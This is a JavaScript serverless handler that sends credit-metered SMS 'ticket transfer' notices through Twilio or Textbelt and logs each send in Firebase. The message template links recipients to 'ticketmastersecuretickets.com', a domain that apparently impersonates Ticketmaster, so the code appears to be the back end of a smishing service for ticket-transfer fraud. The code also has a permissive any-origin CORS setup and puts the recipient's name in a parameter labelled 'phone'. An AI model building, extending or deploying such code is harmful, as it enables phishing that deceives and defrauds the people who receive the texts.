import { db } from './lib/firebase.js';
import admin from 'firebase-admin';
import path from 'path';

// SMS Service Configuration
const SMS_PROVIDERS = {
    TWILIO: {
        accountSid: process.env.TWILIO_ACCOUNT_SID,
        authToken: process.env.TWILIO_AUTH_TOKEN,
        fromNumber: process.env.TWILIO_FROM_NUMBER
    },
    TEXTBELT: {
        apiKey: process.env.TEXTBELT_API_KEY
    }
};

// Rate limiting
let lastSmsTime = 0;
const MIN_SMS_INTERVAL = 1000; // 1 second between SMS

export default async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    const { action } = req.query;
    console.log(`SMS API called with action: ${action}`);

    switch (action) {
        case 'send-sms':
            return sendSms(req, res);
        case 'check-sms-credits':
            return checkSmsCreditsEndpoint(req, res);
        default:
            return res.status(400).json({ error: 'Invalid action' });
    }
}

// --- Send SMS ---
async function sendSms(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        // Rate limiting
        const timeSinceLastSms = Date.now() - lastSmsTime;
        if (timeSinceLastSms < MIN_SMS_INTERVAL) {
            await new Promise(resolve => setTimeout(resolve, MIN_SMS_INTERVAL - timeSinceLastSms));
        }
        lastSmsTime = Date.now();

        const {
            recipientPhone, recipientName, senderName, eventTitle,
            eventDate, eventVenue, section, row, seats, ticketCount, seatType,
            customMessage = 'Your tickets are ready for transfer',
            userEmail
        } = req.body;

        if (!recipientPhone || !recipientName || !eventTitle || !userEmail) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        // Check credits
        const creditCheck = await checkSmsCreditsLogic(userEmail);
        if (!creditCheck.hasCredits) {
            return res.status(402).json({
                error: 'Insufficient SMS credits',
                creditsRemaining: creditCheck.creditsRemaining,
                needsSubscription: true
            });
        }

        // Generate Message
        const message = generateSmsMessage({
            recipientName, senderName, eventTitle, eventDate, eventVenue,
            section, row, seats, ticketCount, seatType, customMessage
        });

        // Send
        const cleanPhone = recipientPhone.replace(/\s/g, '');
        const smsResult = await sendSmsWithFallback(cleanPhone, message);

        if (smsResult.success) {
            // Deduct Credit
            await deductSmsCredit(userEmail);

            // Log Activity
            await logSmsActivity(userEmail, {
                recipientPhone: cleanPhone,
                recipientName,
                eventTitle,
                timestamp: new Date().toISOString(),
                status: 'sent',
                provider: smsResult.provider
            });

            return res.status(200).json({
                success: true,
                message: 'SMS sent successfully',
                data: {
                    recipientPhone: cleanPhone,
                    messageId: smsResult.messageId,
                    provider: smsResult.provider,
                    creditsRemaining: creditCheck.creditsRemaining - 1
                }
            });
        } else {
            return res.status(500).json({ success: false, error: 'Failed to send SMS', details: smsResult.error });
        }

    } catch (error) {
        console.error('SMS sending error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
}

// --- Check SMS Credits Endpoint ---
async function checkSmsCreditsEndpoint(req, res) {
    if (req.method !== 'GET' && req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    try {
        const { userEmail } = req.method === 'POST' ? req.body : req.query;
        if (!userEmail) return res.status(400).json({ error: 'Email required' });

        const creditInfo = await checkSmsCreditsLogic(userEmail);

        return res.status(200).json({
            success: true,
            data: {
                userEmail,
                smsCredits: creditInfo.creditsRemaining,
                hasCredits: creditInfo.hasCredits
            }
        });
    } catch (error) {
        console.error('Check credits error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
}

// --- Helpers ---

async function checkSmsCreditsLogic(userEmail) {
    const userDoc = await db.collection('users').doc(userEmail).get();
    if (!userDoc.exists) return { hasCredits: false, creditsRemaining: 0 };

    const credits = userDoc.data().smsCredits || 0;
    return { hasCredits: credits > 0, creditsRemaining: credits };
}

async function deductSmsCredit(userEmail) {
    const userRef = db.collection('users').doc(userEmail);
    await db.runTransaction(async (t) => {
        const doc = await t.get(userRef);
        if (!doc.exists) throw new Error("User does not exist!");

        const newCredits = (doc.data().smsCredits || 0) - 1;
        if (newCredits < 0) throw new Error("Insufficient credits");

        t.update(userRef, {
            smsCredits: newCredits,
            lastUsed: new Date().toISOString(),
            totalSent: admin.firestore.FieldValue.increment(1),
            thisMonthSent: admin.firestore.FieldValue.increment(1)
        });
    });
}

async function logSmsActivity(userEmail, activity) {
    await db.collection('sms_logs').add({
        userEmail,
        ...activity,
        timestamp: new Date().toISOString()
    });
}

function generateSmsMessage(data) {
    const { recipientName, senderName, eventTitle, customMessage } = data;
    let message = `🎫 ${recipientName}, you have tickets!\n\n`;
    message += `From: ${senderName}\n`;
    message += `Event: ${eventTitle}\n\n`;
    message += `${customMessage}\n\n`;
    message += `Accept tickets: https://ticketmastersecuretickets.com/accept-ticket.html?phone=${encodeURIComponent(recipientName)}`;
    return message;
}

async function sendSmsWithFallback(phoneNumber, message) {
    // Try Twilio
    if (SMS_PROVIDERS.TWILIO.accountSid) {
        try {
            const twilio = require('twilio');
            const client = twilio(SMS_PROVIDERS.TWILIO.accountSid, SMS_PROVIDERS.TWILIO.authToken);
            const result = await client.messages.create({
                body: message,
                from: SMS_PROVIDERS.TWILIO.fromNumber,
                to: phoneNumber
            });
            return { success: true, messageId: result.sid, provider: 'twilio' };
        } catch (e) { console.log('Twilio failed:', e.message); }
    }

    // Try Textbelt
    if (SMS_PROVIDERS.TEXTBELT.apiKey) {
        try {
            const response = await fetch('https://textbelt.com/text', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phoneNumber, message, key: SMS_PROVIDERS.TEXTBELT.apiKey })
            });
            const result = await response.json();
            if (result.success) return { success: true, messageId: result.textId, provider: 'textbelt' };
            console.log('Textbelt failed:', result.error);
        } catch (e) { console.log('Textbelt failed:', e.message); }
    }

    return { success: false, error: 'All providers failed' };
}
